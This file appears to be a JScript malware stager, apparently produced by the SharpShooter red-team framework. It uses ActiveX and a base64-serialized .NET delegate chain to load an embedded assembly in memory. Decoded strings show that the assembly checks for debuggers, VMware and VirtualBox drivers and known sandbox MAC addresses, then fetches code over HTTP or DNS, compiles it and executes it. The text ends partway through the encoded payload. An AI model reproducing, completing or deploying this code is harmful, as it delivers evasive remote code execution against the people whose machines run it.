function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAADQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAT2ScWgAAAAAA"+
"AAAA4AAiIAsBMAAAKgAAAAgAAAAAAAAKSQAAACAAAABgAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAKAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAuEgA"+
"AE8AAAAAYAAAVAQAAAAAAAAAAAAAAAAAAAAAAAAAgAAADAAAAIBHAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAAQKQAAACAAAAAqAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAVAQAAABg"+
"AAAABgAAACwAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAgAAAAAIAAAAyAAAAAAAAAAAA"+
"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"+
"BwgWc1IAAApvUwAACg4ELAsCDgUoCgAABg0rCQIOBSgMAAAGDQYHF40gAAABJRYJom9UAAAKEwQR"+
"BG9VAAAKb1YAAAoscnNXAAAKEwgRBG9VAAAKb1gAAAoTCSsuEQlvWQAACnQdAAABEwoRCHI+DABw"+
"EQpvWgAAChEKb1sAAAooXAAACm9dAAAKJhEJb14AAAotyd4VEQl1HgAAARMLEQssBxELbzIAAArc"+
"EQhvFwAACnNfAAAKehEEb2AAAAoEb2EAAAoFb2IAAAoUFG9jAAAKJioAAAABEAAAAgDYADsTARUA"+
"AAAAQlNKQgEAAQAAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAYAYAACN+AADMBgAArAkAACNT"+
"dHJpbmdzAAAAAHgQAABgDAAAI1VTANgcAAAQAAAAI0dVSUQAAADoHAAAHAMAACNCbG9iAAAAAAAA"+
"AAIAAAFHFQIICQAAAAD6ATMAFgAAAQAAAEYAAAADAAAADwAAABMAAABjAAAADgAAAAoAAAACAAAA"+
"AQAAAAIAAAAAAPEDAQAAAAAABgDDAqkGBgAwA6kGBgAQAl8GDwDJBgAABgA4AnoEBgCmAnoEBgCH"+
"AnoEBgAXA3oEBgDjAnoEBgD8AnoEBgBPAnoEBgAkAooGBgACAooGBgBqAnoEBgBmCC8EBgABAGIA"+
"CgDuAFwEBgAQBS8ECgDXA0oHCgD/B18GBgAfBC4ABgAZBC4ACgAOBEYECgCbBVcFCgDHB+MFCgAz"+
"COMFBgC+BR8JBgA4BmkHCgAqBuMFBgBCAS8ECgD0BlwEBgDCAy8EBgAaBS8EBgBlAS4ACgAKCFwE"+
"CgBMCUoHBgBuBS8EBgDaBV8GBgCNCC8EBgCQBy8ECgCDCG0ICgDUBG0ICgCfBLMABgDGCC8ECgBA"+
"BV8GCgB6AV8GBgCDBS4ABgCQBS4ACgCjB0oHCgBoBUoHCgDEBEoHCgDAAUoHBgAIAC8EBgBiAy8E"+
"CgArAUYEBgCNAx8JBgAPAGIABgAOAGIACgCzBLMAnwDMBQAABgDmAy4ACgCMBOMFCgCuBeMFCgDo"+
"BOMFBgDTAWkHBgAABS8EBgCHCXoEBgC7AS8EBgA1BXoEBgDIAXoEAAAAACUAAAAAAAEAAQAAABAA"+
"4gEAAD0AAQABAAEAEAD7BQAAPQABAAcAUCAAAAAAhgA2BG0AAQBoIAAAAACGAKQA7wACAIQgAAAA"+
"AIYAGgjvAAIA5CEAAAAAhgBZAO8AAgC3IgAAAACGAIoA7wACAMMiAAAAAIYYUgYGAAIAwyIAAAAA"+
"hhhSBgYAAgDMIgAAAACGAOIBCgICAEgjAAAAAIYAKwUQAgQAqCMAAAAAgQBJALQACQDsIwAAAACB"+
"AD8AtAAKANAkAAAAAIEAOAC0AAsAUCUAAAAAgQAuBRkCDACEJQAAAACBAFEFagEOAAwmAAAAAIEA"+
"ugghAg8AAAABAD8EAAABAOsDAAACANMDAAABAFgGAAACAAcBAAADAKUIAAAEAHEDAAAFANMIAAAB"+
"AAoEAAABAJwBAAABAD8EAAABAH0AAAACAM4IAAABABUHAAABABsHAAACAKUIAAADAOcAAAAEAHsD"+
"AAAFAN0ICQBSBgEAEQBSBgYAGQBSBgoAKQBSBhAAMQBSBhAAOQBSBhAAQQBSBhAASQBSBhAAUQBS"+
"BhAAWQBSBhAAYQBSBhUAaQBSBhAAcQBSBhAA+QDxBhoA+QCNAR8AAQE6ByMADABSBgYAEQFRCD4A"+
"DACGAEMADACwCEkAiQByBmEAiQAHCGcAeQC2Ax8AAQEIBh8AAQFBB20AIQH/AHIAAQHSAHkAMQGV"+
"AH8AeQBSBgYAOQF+CIgAAQFaCZQAAQF4CJkASQFSBgYASQG7B6gAWQGGAK4ASQEgBxUASQGnA7QA"+
"YQGWA7kAAQFfCMoAaQFSBhAAaQFDCBAAaQH7CBUAaQEQBhUAaQFOAxUAaQFqAdAAaQE5CRUAoQDA"+
"CNcAoQDoCN8AgQHaAB8A8QDuAQYAIQHXA+UAkQHzB+8AmQCwB/MAmQEmBPkAoQFnAx8AAQGlCQAB"+
"AQH/AAMBAQFYCBIBAQGFAxgBAQHJAx4BqQH2ASQBAQFYCCkBqQD8ATYBqQCBAD4BsQBSBlABsQBS"+
"BgYAuQBSBlYBwQEcAF8BsQBSCWUBwQG/A2oBFABSBgYAFACGAI8BwQBSBpcByQBSBgYAyQDYBqIB"+
"2QGGAKgByQBOARUAyQCQCRUAyQB8BxAAOQHdA60B6QGwARIB8QFSBrQByQAHB7oB+QERAcEB0QDa"+
"B8oBAQLlB+8A2QBSBgYACQJEBtAB4QCZCNUB6QBzBR8A6QArCR8AAQFfCNkB2QClAeAB4QAWCe8A"+
"EQJSBhAA0QBmCeYBGQK4AewBIQLkAPMBMQI7AfoBLgALACsCLgATADQCLgAbAFMCLgAjAFwCLgAr"+
"AHYCLgAzAJkCLgA7AJ8CLgBDAFwCLgBLALcCLgBTAJkCLgBbAJkCLgBjAN8CLgBrAAkDYwBbABYD"+
"LABNAIMAjQCjAL8ACQEwAUYBcAE4AIcBBIAAAAEAAAAAAAAAAAAAAAAAewkAAAIAAAAAAAAAAAAA"+
"AAECUAAAAAAAAgAAAAAAAAAAAAAAAQIvBAAAAAAAAAAAAExpc3RgMQBJbnQzMgBJRGljdGlvbmFy"+
"eWAyAGdldF9VVEY4ADxNb2R1bGU+AFN5c3RlbS5JTwBBaW1ETlMATG9va3VwRE5TAEFpbVdlYgBt"+
"c2NvcmxpYgBpc0JhZE1hYwBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBzcmMAUmVhZABBZGQA"+
"aXNEZWJ1Z2dlZABnZXRfSXNBdHRhY2hlZABpc0RvbWFpbkpvaW5lZABTeXN0ZW0uQ29sbGVjdGlv"+
"bnMuU3BlY2lhbGl6ZWQAVHJpbUVuZABSZWFkVG9FbmQAR2V0TWV0aG9kAE5ldHdvcmtJbnRlcmZh"+
"Y2UAUmVwbGFjZQBOYW1lU3BhY2UAQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZQBDb21wcmVzc2lv"+
"bk1vZGUASW52b2tlAElEaXNwb3NhYmxlAHNldF9HZW5lcmF0ZUV4ZWN1dGFibGUARmlsZQBzZXRf"+
"V2luZG93U3R5bGUAUHJvY2Vzc1dpbmRvd1N0eWxlAGdldF9Eb21haW5OYW1lAGhvc3RuYW1lAEFw"+
"cGVuZExpbmUAQ29tYmluZQBHZXRUeXBlAENhcHR1cmUATWV0aG9kQmFzZQBDb2xsZWN0aW9uQmFz"+
"ZQBDaGVja1BsZWFzZQBEaXNwb3NlAFBhcnNlAFdyaXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJs"+
"ZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNz"+
"ZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3Nl"+
"bWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBD"+
"b21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBB"+
"c3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGlt"+
"ZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAc2V0X1VzZVNoZWxsRXhlY3V0ZQBCeXRlAGdldF9WYWx1"+
"ZQBUZWNobmlxdWUAdGVjaG5pcXVlAEluZGV4T2YARW5jb2RpbmcARnJvbUJhc2U2NFN0cmluZwBE"+
"b3dubG9hZFN0cmluZwBUb1N0cmluZwBHZXRTdHJpbmcAU3Vic3RyaW5nAGFyZwBNYXRjaABHZXRG"+
"b2xkZXJQYXRoAGNoZWNrAFNoYXJwU2hvb3RlckFzc2VtYmx5LmRsbAB1cmwAR1ppcFN0cmVhbQBN"+
"ZW1vcnlTdHJlYW0AZ2V0X0l0ZW0AU3lzdGVtAGlzRG9tYWluAGRvbWFpbgBTeXN0ZW0uSU8uQ29t"+
"cHJlc3Npb24AU3lzdGVtLk5ldC5OZXR3b3JrSW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24A"+
"VGVtcEZpbGVDb2xsZWN0aW9uAE5hbWVWYWx1ZUNvbGxlY3Rpb24AU3RyaW5nQ29sbGVjdGlvbgBH"+
"cm91cENvbGxlY3Rpb24AV2ViSGVhZGVyQ29sbGVjdGlvbgBDb21waWxlckVycm9yQ29sbGVjdGlv"+
"bgBJbnZhbGlkT3BlcmF0aW9uRXhjZXB0aW9uAFN0cmluZ0NvbXBhcmlzb24AR28AQ29weVRvAE1l"+
"dGhvZEluZm8AUHJvY2Vzc1N0YXJ0SW5mbwBVbnppcABNaWNyb3NvZnQuQ1NoYXJwAEdyb3VwAENo"+
"YXIAZ2V0X0Vycm9yTnVtYmVyAFN0cmVhbVJlYWRlcgBUZXh0UmVhZGVyAENTaGFycENvZGVQcm92"+
"aWRlcgBDb2RlRG9tUHJvdmlkZXIAU3RyaW5nQnVpbGRlcgBTcGVjaWFsRm9sZGVyAERlYnVnZ2Vy"+
"AFN5c3RlbS5Db2RlRG9tLkNvbXBpbGVyAFNoYXJwU2hvb3RlcgBUb0xvd2VyAHNldF9SZWRpcmVj"+
"dFN0YW5kYXJkRXJyb3IAQ29tcGlsZXJFcnJvcgBJRW51bWVyYXRvcgBHZXRFbnVtZXJhdG9yAC5j"+
"dG9yAFJlZlN0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAR2V0QWxsTmV0d29ya0ludGVyZmFjZXMAU3lz"+
"dGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2Vydmlj"+
"ZXMARGVidWdnaW5nTW9kZXMAZ2V0X1JlZmVyZW5jZWRBc3NlbWJsaWVzAEdldElQR2xvYmFsUHJv"+
"cGVydGllcwBzZXRfVGVtcEZpbGVzAGJ5dGVzAHJlZnMAc2V0X1VzZURlZmF1bHRDcmVkZW50aWFs"+
"cwBFcXVhbHMAQ29udGFpbnMAU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zAFN5c3RlbS5D"+
"b2xsZWN0aW9ucwBzZXRfQ29tcGlsZXJPcHRpb25zAFN0cmluZ1NwbGl0T3B0aW9ucwBSZWdleE9w"+
"dGlvbnMAZ2V0X0dyb3VwcwBnZXRfSGVhZGVycwBDb21waWxlclBhcmFtZXRlcnMAZ2V0X0Vycm9y"+
"cwBnZXRfSGFzRXJyb3JzAGdldF9TdWNjZXNzAFByb2Nlc3MAR2V0UGh5c2ljYWxBZGRyZXNzAGNv"+
"bnRhaW5zU2FuZGJveEFydGlmYWN0cwBDb21waWxlclJlc3VsdHMAc2V0X0FyZ3VtZW50cwBFeGlz"+
"dHMAQ29uY2F0AEZvcm1hdABPYmplY3QAU3lzdGVtLk5ldABTcGxpdABFeGl0AFdlYkNsaWVudABF"+
"bnZpcm9ubWVudABnZXRfQ3VycmVudABFbnRyeVBvaW50AGdldF9Db3VudABTaG9vdABTdGFydABD"+
"b252ZXJ0AGRlc3QAU3RhZ2VIb3N0AHN0YWdlcmhvc3QAZ2V0X1N0YW5kYXJkT3V0cHV0AHNldF9S"+
"ZWRpcmVjdFN0YW5kYXJkT3V0cHV0AE1vdmVOZXh0AFN5c3RlbS5UZXh0AGdldF9FcnJvclRleHQA"+
"c2V0X0NyZWF0ZU5vV2luZG93AFJlZ2V4AFRvQXJyYXkAVG9DaGFyQXJyYXkAZ2V0X0NvbXBpbGVk"+
"QXNzZW1ibHkAU2hhcnBTaG9vdGVyQXNzZW1ibHkAc2V0X0dlbmVyYXRlSW5NZW1vcnkARW1wdHkA"+
"AAABAFFDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUA"+
"cgBzAFwAVgBtAG0AbwB1AHMAZQAuAHMAeQBzAABPQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBz"+
"AG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQAzAGQAZwBsAC4AZABsAGwAAE1DADoA"+
"XAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBt"+
"AGQAdQBtAC4AZABsAGwAAFFDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUA"+
"XABEAHIAaQB2AGUAcgBzAFwAdgBtADMAZAB2AGUAcgAuAGQAbABsAABPQwA6AFwAdwBpAG4AZABv"+
"AHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQB0AHIAYQB5AC4A"+
"ZABsAGwAAEtDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2"+
"AGUAcgBzAFwAdgBtAGMAaQAuAHMAeQBzAABXQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4A"+
"YQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQB1AHMAYgBtAG8AdQBzAGUALgBzAHkAcwAA"+
"U0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMA"+
"XAB2AG0AeABfAHMAdgBnAGEALgBzAHkAcwAAT0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBu"+
"AGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMAXAB2AG0AeABuAGUAdAAuAHMAeQBzAABZQwA6AFwA"+
"dwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAFYATQBU"+
"AG8AbwBsAHMASABvAG8AawAuAGQAbABsAABPQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4A"+
"YQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQBoAGcAZgBzAC4AZABsAGwAAFdDADoAXAB3"+
"AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBtAG0A"+
"bwB1AHMAZQB2AGUAcgAuAGQAbABsAABXQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0"+
"AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQBHAHUAZQBzAHQATABpAGIALgBkAGwAbAAAX0MA"+
"OgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMAXABW"+
"AG0ARwB1AGUAcwB0AEwAaQBiAEoAYQB2AGEALgBkAGwAbAAAT0MAOgBcAHcAaQBuAGQAbwB3AHMA"+
"XABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMAXAB2AG0AcwBjAHMAaQAuAHMAeQBz"+
"AABVQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIA"+
"cwBcAFYAQgBvAHgATQBvAHUAcwBlAC4AcwB5AHMAAFVDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5"+
"AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAVgBCAG8AeABHAHUAZQBzAHQALgBzAHkA"+
"cwAAT0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQBy"+
"AHMAXABWAEIAbwB4AFMARgAuAHMAeQBzAABVQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4A"+
"YQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAFYAQgBvAHgAVgBpAGQAZQBvAC4AcwB5AHMAAEND"+
"ADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXAB2AGIAbwB4AGQAaQBzAHAA"+
"LgBkAGwAbAAAQ0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAHYAYgBv"+
"AHgAaABvAG8AawAuAGQAbABsAABFQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkA"+
"dgBlAFwAdgBiAG8AeABtAHIAeABuAHAALgBkAGwAbAAAQUMAOgBcAHcAaQBuAGQAbwB3AHMAXABT"+
"AHkAcwBuAGEAdABpAHYAZQBcAHYAYgBvAHgAbwBnAGwALgBkAGwAbAAAUUMAOgBcAHcAaQBuAGQA"+
"bwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAHYAYgBvAHgAbwBnAGwAYQByAHIAYQB5AHMAcAB1"+
"AC4AZABsAGwAAE1DADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXAB2AGIA"+
"bwB4AG8AZwBsAGMAcgB1AHQAaQBsAC4AZABsAGwAAFFDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5"+
"AHMAbgBhAHQAaQB2AGUAXAB2AGIAbwB4AG8AZwBsAGUAcgByAG8AcgBzAHAAdQAuAGQAbABsAABX"+
"QwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABvAGcAbABm"+
"AGUAZQBkAGIAYQBjAGsAcwBwAHUALgBkAGwAbAAAT0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkA"+
"cwBuAGEAdABpAHYAZQBcAHYAYgBvAHgAbwBnAGwAcABhAGMAawBzAHAAdQAuAGQAbABsAABdQwA6"+
"AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeABvAGcAbABwAGEA"+
"cwBzAHQAaAByAG8AdQBnAGgAcwBwAHUALgBkAGwAbAAASUMAOgBcAHcAaQBuAGQAbwB3AHMAXABT"+
"AHkAcwBuAGEAdABpAHYAZQBcAHYAYgBvAHgAcwBlAHIAdgBpAGMAZQAuAGUAeABlAABDQwA6AFwA"+
"dwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwAdgBiAG8AeAB0AHIAYQB5AC4AZQB4"+
"AGUAAElDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABWAEIAbwB4AEMA"+
"bwBuAHQAcgBvAGwALgBlAHgAZQAADTAAMAAwAEMAMgA5AAANMAAwADEAQwAxADQAAA0wADAANQAw"+
"ADUANgAADTAAMAAwADUANgA5AAANMAA4ADAAMAAyADcAAAkuAHsAMgB9AAAHJAAwADoAAAMsAAAV"+
"VQBzAGUAcgAtAEEAZwBlAG4AdAABgItNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQA"+
"bwB3AHMAIABOAFQAIAAxADAALgAwADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3"+
"AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAAPXsAMAB9AFwA"+
"cwAqAHQAZQB4AHQAIAA9AFwAcwAqACgAWwAiAF0AKQAoAC4AKgA/ACkAKABbACIAXQApAAAfKABb"+
"ACIAXQApACgALgAqAD8AKQAoAFsAIgBdACkAABFuAHMAbABvAG8AawB1AHAAAEMtAHQAeQBwAGUA"+
